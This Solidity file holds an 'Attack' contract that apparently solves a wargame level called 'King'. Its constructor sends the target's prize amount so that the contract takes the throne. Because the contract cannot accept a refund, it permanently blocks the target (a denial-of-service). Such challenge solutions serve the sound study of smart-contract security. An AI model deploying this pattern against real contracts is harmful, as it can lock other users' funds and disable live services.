// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../King/King.sol";

contract Attack {
    address public target;

    constructor(King _target) payable {
        address(_target).call{value: _target.prize()}("");
    }

}